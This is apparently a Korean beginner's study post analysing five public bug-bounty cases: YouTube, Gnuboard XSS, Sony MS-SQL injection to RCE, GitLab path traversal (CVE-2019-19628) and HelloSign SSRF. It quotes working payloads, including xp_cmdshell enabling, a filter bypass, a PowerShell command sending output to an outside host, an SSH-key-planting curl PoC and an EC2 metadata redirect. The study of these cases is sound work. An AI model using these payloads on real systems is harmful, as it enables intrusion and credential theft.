---
title : "[버그헌팅초급] 버그헌팅 사례 분석-1"
date : "2026-09-25"
bookmark :  true
---


# 웹 취약점 버그헌팅 사례 분석
----------------------------------

## 사례 1: YouTube 비공개 영상 프레임 탈취 (2019)

![설명]({{ '/assets/img/ads-moments.gif' | relative_url }})

(출처:https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/)

- 제목: "Stealing Private YouTube Videos, One Frame at a Time"
- YouTube 영상 공개 설정: 공개 / 일부 공개(링크 공유) / 비공개
  - 비공개 영상은 본인과 본인이 허용한 사람만 볼 수 있어야 함
- 취약점 발생 지점은 YouTube 자체가 아니라 연동된 서비스인 Google Ads였음
  - 유튜버가 영상에 광고를 삽입할 때 특정 시점(초 단위)에 광고가 나오도록 설정 가능
  - 광고 요소(로고, 상품 이미지 등)를 추가하는 "Mark Moment" 버튼 클릭 시 서버로 HTTP 요청이 발생함
- 요청 페이로드 분석
  - 요청 바디에 동영상 고유 ID + 타임스탬프(밀리세컨드 단위)가 포함됨
  - `GetThumbnails`라는 POST 요청을 보내면 Base64로 인코딩된 썸네일 이미지를 응답으로 받음
  - 한 번의 요청으로 얻는 썸네일 하나는 영상의 33밀리세컨드 시점에 해당함
- 악용 방법: 33밀리세컨드 간격으로 반복 요청해서 프레임을 하나씩 모두 추출 → 이어 붙여서 저화질이지만 비공개 영상 전체를 재구성함
- 한계: 동영상 고유 ID를 알아야 함 (항상 쉽게 얻을 수 있는 정보는 아님)
- 시사점: 서드파티(3rd Party) 연동 서비스에서도 취약점이 나올 수 있다는 것, 창의적인 접근이 예상치 못한 취약점 발견으로 이어질 수 있다는 것

## 사례 2: 그누보드(Gnuboard) Reflected XSS (2023.4 패치)
(출처:https://github.com/gnuboard/gnuboard5/blob/v5.5.8.2.9/lib/common.lib.php#L29
)
- 그누보드: PHP 기반의 국내 CMS, XSS가 가장 많이 발견됐던 취약점 중 하나임
- 현재는 Reflected XSS의 경우 제보는 가능하지만 보상(Bounty) 대상에서는 제외됨
- 페이로드: 취약한 GET 파라미터에 큰따옴표로 HTML 속성을 벗어난 뒤 `<script>` 태그를 삽입
- 원인 분석 (v5.5.8.2.9)
- `bbs/search.php`에서 GET으로 받은 `onetable` 값이 검증 없이 그대로 페이징 URL 문자열에 이어 붙여짐:
    ```php
    // bbs/search.php
    $write_pages = get_paging(
        G5_IS_MOBILE ? $config['cf_mobile_pages'] : $config['cf_write_pages'],
        $page,
        $total_page,
        $_SERVER['SCRIPT_NAME'].'?'.$search_query
            .'&amp;gr_id='.$gr_id
            .'&amp;srows='.$srows
            .'&amp;onetable='.$onetable   // ← 필터링 없이 그대로 URL에 삽입
            .'&amp;page='
    );
    ```
  - 이 값이 `get_paging()` 함수의 네 번째 인자(URL)로 전달됨
  - 현재 페이지(`$cur_page`) 값이 1보다 크면 이 URL 값이 `<a href="">` 태그 안에 문자열 이어붙이기(`.`) 방식으로 그대로 삽입되어 반환됨:
    ```php
    // lib/common.lib.php - get_paging()
    function get_paging($write_pages, $cur_page, $total_page, $url, $add="")
    {
        $url = preg_replace('#(&amp;)?page=[0-9]*#', '', $url);
        $url .= substr($url, -1) === '?' ? 'page=' : '&amp;page=';
        $str = '';
        if ($cur_page > 1) {
            $str .= '<a href="'.$url.'1'.$add.'" class="pg_page pg_start">처음</a>'.PHP_EOL;
        }
        // ... 이후 페이지 번호 링크들도 동일한 방식으로 $url을 그대로 삽입
    }
    ```
  - 반환된 HTML(`$write_pages`)이 검색 결과 스킨(`search.skin.php`)에서 그대로 출력됨 → 필터링 없이 삽입된 스크립트가 그대로 실행됨
  - 페이로드가 URL 파라미터를 통해 전달되는 구조라 Reflected XSS로 분류됨
- 패치(5.5.8.3 버전): 취약했던 파라미터 값을 정규식(Regex)으로 검사해 특수문자가 들어올 수 없도록 제한함


## 사례 3: Sony MS-SQL Injection → RCE
- Time-based SQL Injection을 발견한 사례임
  - `WAITFOR DELAY`, `SLEEP` 같은 명령을 삽입해서, 응답이 돌아오는 시간 차이로 조건의 참/거짓을 판단하는 기법

- 확인 과정
  1. 관리자 패널로 보이는 로그인 페이지에서 `username=123'&password=123'`처럼 작은따옴표(`'`)를 넣어 SQL 오류를 유도함 → 디버그 모드가 꺼져 있지 않아 전체 쿼리와 파일 경로까지 노출되는 500 에러 페이지를 확인 → 사용 중인 DB가 MS SQL임을 확인

  2. `username` 파라미터에는 필터링이 걸려 있어 실패했지만, 오류 메시지를 살펴보다가 **User-Agent 헤더 값도 그대로 쿼리에 들어간다**는 것을 발견함
     ```
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...'--
     ```
     → 작은따옴표 + 주석(`--`)을 붙였을 때 정상 페이지가 반환됨 → 서버가 User-Agent 값을 그대로 실행하고 있다는 신호
     
  3. `WAITFOR DELAY`로 테스트 → Stacked Query(세미콜론으로 구분된 2개 이상의 쿼리를 같은 트랜잭션에서 실행하는 방식)가 지원되는 것을 확인
     ```
     User-Agent: Mozilla/5.0 ...';WAITFOR DELAY '00:00:05';--
     ```
     → 응답이 실제로 약 5초 지연됨 → 쿼리를 끊어 임의 쿼리를 추가로 실행할 수 있다는 것을 확인
- 취약점 확장 과정 (RCE로)
  - Stacked Query가 가능하다는 걸 확인한 뒤, `xp_cmdshell`을 활성화하는 쿼리를 User-Agent에 실어 전송함
    ```
    User-Agent: Mozilla/5.0 ...'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
    ```
  - `ping`으로 블라인드 RCE 여부를 1차 확인함
    ```
    User-Agent: Mozilla/5.0 ...'; EXEC xp_cmdshell 'ping {버프컬래버레이터 도메인}';--
    ```
    → Burp Collaborator에 실제로 DNS/HTTP 히트가 발생 → 명령 실행 확인
  - 결과를 안전하게(비파괴적으로) 받아오기 위해, PowerShell로 명령 결과를 변수에 담아 `curl`로 자신의 Burp Collaborator 서버에 GET 요청으로 전송하는 방식을 사용함
    ```
    User-Agent: Mozilla/5.0 ...';EXEC xp_cmdshell 'powershell -c "$x = whoami; curl http://{버프컬래버레이터}/get?output=$x"';--
    ```
    → `whoami` 실행 결과(사용자 이름)가 실제로 요청 파라미터에 담겨 제보자 서버로 전달됨
  - 이 과정에서 AWS EC2 인스턴스의 메타데이터 정보나 서버 내 파일까지도 조회 가능했다고 함
- WAF(방화벽) 우회
  - 최초 패치는 `EXEC xp_cmdshell`이라는 문자열 자체만 차단하는 방식이었음
  - `EXEC`, `xp_cmdshell`을 각각 따로 보내면 차단되지 않는 것을 확인함
  - `DECLARE`로 변수(`@x`)에 `xp_cmdshell` 문자열을 담아두고, `EXEC @x` 형태로 문자열을 분리해서 필터를 우회함
    ```
    '; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping {버프컬래버레이터 도메인}'--
    ```
- 타임라인: 최초 제보(2021.9.14) → 1차 패치(9.21, 우회됨) → 2차 패치(9.23, 다시 우회됨) → 최종 패치(9.26) → 해결 및 보상(9.27)
- 시사점: SQL Injection을 발견해도 거기서 멈추지 말고 RCE, 파일 읽기 등으로 파급력을 확장해보는 시도가 중요함. 단순 문자열 필터링은 우회될 가능성이 크다는 것도 기억해둘 것

 (원문: [How I Escalated a Time-Based SQL Injection to RCE](https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398) )

## 사례 4: GitLab Path Traversal → RCE
- 대상: GitLab
- 취약점: Path Traversal(Directory Traversal), `../` 같은 상대 경로로 상위 디렉터리에 접근 가능한 취약점
- 영향: 공격자가 GitLab의 SSH 키 저장소에 자신의 SSH 공개키를 임의로 저장 → SSH 접속 후 명령 실행까지 가능

- 취약한 엔드포인트: `/api/v4/projects/:id/packages/maven/*path/:file_name` (Maven 패키지 파일 업로드용 PUT 엔드포인트)
- 실제 PoC (HackerOne 리포트 원문):
  ```bash
  curl -H "Private-Token: $(cat token)" \
    "http://<gitlab-host>/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys" \
    -XPUT --path-as-is --data-binary @/home/attacker/.ssh/id_rsa.pub
  ```
  - `%2f`는 `/`, `%2e%2e%2f`는 `../`의 URL 인코딩 값
  - `path` 자리에 `../`를 반복해서 넣어 상위 디렉터리로 이동 → 최종적으로 `.ssh/authorized_keys` 경로에 공격자의 공개키(`id_rsa.pub`)가 업로드됨
  - 이후 `ssh git@<gitlab-host>`로 접속하면 셸 접근이 가능해짐
- 공격 조건: 패키지 레지스트리 기능 활성화 → 프로젝트 생성 → 프라이빗 토큰 생성 후 `curl` 명령으로 공격 페이로드 전송
  - `curl` 옵션: `-H`(헤더 설정), `-X`(HTTP 메서드 지정), `--path-as-is`(curl이 자체적으로 `../`를 정규화하지 않도록 방지), `--data-binary`(지정한 파일을 데이터로 업로드)
  - 결과: 공격자의 `id_rsa.pub`(SSH 공개키)가 GitLab의 SSH 키 저장소 경로에 그대로 생성됨
- 원인 분석 — 실제 소스(`lib/api/maven_packages.rb`)
  - GitLab은 Ruby on Rails 기반이고, REST API는 Grape 프레임워크가 처리함
  - 엔드포인트 정의에 다음과 같은 필터링 요구사항(requirements)이 있음:
    ```ruby
    # lib/api/maven_packages.rb
    module API
      class MavenPackages < ::API::Base
        MAVEN_ENDPOINT_REQUIREMENTS = {
          file_name: API::NO_SLASH_URL_PART_REGEX
        }.freeze
        # ...
        params do
          requires :path, type: String, desc: 'Package path'
          requires :file_name, type: String, desc: 'Package file name',
                   regexp: Gitlab::Regex.maven_file_name_regex
        end
      end
    end
    ```
  - `file_name`(마지막 파일 이름 부분)에는 `NO_SLASH_URL_PART_REGEX`와 별도의 정규식(`maven_file_name_regex`, 영문 대소문자·숫자·`.`·`_`·`-`·`+`만 허용)이 걸려 있어, 파일명 자체에 `../`나 `/`를 넣는 건 막혀 있음
  - 하지만 `path`(와일드카드 `*path` 세그먼트) 파라미터에는 이런 필터링이 전혀 없음 → 여기에 `../`를 반복해서 넣으면 그대로 통과됨
  - Grape 프레임워크의 라우팅은 와일드카드 경로(`*path`) 세그먼트를 있는 그대로 넘겨주는 특성이 있어(관련: [ruby-grape/grape](https://github.com/ruby-grape/grape)), 이 부분이 별도로 검증되지 않으면 경로 조작에 취약해짐
  - 결과적으로 파일명은 필터링되지만 경로(path)는 필터링되지 않아, 입력값이 그대로 파일 업로드 경로로 사용됨 → Path Traversal 발생
- 시사점: 서비스 고유의 특성(SSH 키 저장 방식 등)을 잘 활용하면, 단순 파일 업로드/경로 취약점도 RCE 수준까지 영향력을 확장할 수 있음

(참고: [CVE-2019-19628](https://app.opencve.io/cve/CVE-2019-19628), [GitLab 소스 - lib/api/maven_packages.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/v12.5.3-ee/lib/api/maven_packages.rb), [ruby-grape/grape](https://github.com/ruby-grape/grape) )


## 사례 5: Dropbox SSRF (HelloSign, 2020)
- 제보자는 드롭박스 버그바운티 대상 중 하나인 HelloSign을 탐색하다가, 드롭박스/구글 드라이브/박스(Box)/원드라이브/에버노트 등에서 문서를 가져오는 기능을 발견함
- 이 지점에서 SSRF(Server-Side Request Forgery) 가능성을 의심함
- 1차 시도: 드롭박스 임포트 요청의 `file_reference` 파라미터 값을 자신의 Burp Collaborator 주소로 변경 → 404 에러 발생 → 방어 로직(SSRF 방어)이 있다고 판단하고 일단 중단
- 재시도 포인트: 다음 날 원드라이브 기능으로 다시 시도하며 실제 요청을 자세히 살펴봄
  ```http
  GET /attachment/externalFile?service_type=O&file_reference=MYONEDRIVEFILELINKHERE&file_name=FILENAME.ANYTHING&c=0.8261955039214062 HTTP/1.1
  Host: app.hellosign.com
  ...
  ```
  - 드롭박스 요청은 `service_type=D`였는데, 원드라이브 요청은 `service_type=O`로 다르다는 점에 주목함
  - 서비스 타입별로 필터링 로직이 다르게(또는 불완전하게) 적용됐을 수 있다고 추측
  - `file_reference` 파라미터 값을 자신의 Collaborator 링크로 바꿔서 전송 → 실제로 콜백(ping)을 받는 데 성공 → HelloSign이 그 내용을 담아 PDF까지 생성해줌 → SSRF 가능성 확정
- 영향력 확장
  - WhatIsMyIPAddress.com으로 대상이 AWS/EC2를 사용 중임을 확인함
  - `http://169.254.169.254/latest/`(EC2 메타데이터 엔드포인트)와 `http://127.0.0.1`로 직접 시도 → 둘 다 404로 막힘 (내부 IP 대역 직접 요청은 차단되는 것으로 판단)
  - HackerOne Hacktivity에서 비슷한 사례([HackerOne report #247680](https://hackerone.com/reports/247680))를 찾음 — 303 리다이렉트로 SSRF 방어를 우회한 사례

- 우회 방법: 303 리다이렉션을 이용
  - 자신의 서버에 다음 PHP 코드를 호스팅함:
    ```php
    <?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
    ```
  - `file_reference` 파라미터에 이 서버 주소를 넣어 요청 → HelloSign 서버가 이 URL을 호출 → 303 리다이렉트를 그대로 따라가며 결국 EC2 메타데이터를 조회 → 그 결과(액세스 키, 토큰 등)가 제보자에게 반환됨
- 이후 시도: 탈취한 액세스 키/토큰으로 `aws ec2 stop-instances --instance-ids <id>` 명령을 실행해 RCE/추가 피해까지 시도했지만, 해당 IAM 역할에 권한이 부족해 실패함
- 결과: 제보 3시간 만에 트리아지(triage) 완료, 9일 만에 $4,913 보상 지급
- 시사점
  - 필터링 자체를 직접 우회하려 하기보다, 리다이렉션처럼 새로운 우회 경로를 만드는 발상이 핵심이었음
  - 예상한 결과가 안 나와도 포기하지 않고 다른 파라미터(서비스 타입), 다른 접근 방식을 계속 시도하는 끈기가 중요함
  - 다른 사람의 HackerOne 공개 리포트(Hacktivity)를 참고해서 우회 아이디어를 얻은 것도 눈여겨볼 부분

(원문: [SSRF (Server Side Request Forgery) worth $4,913](https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb) )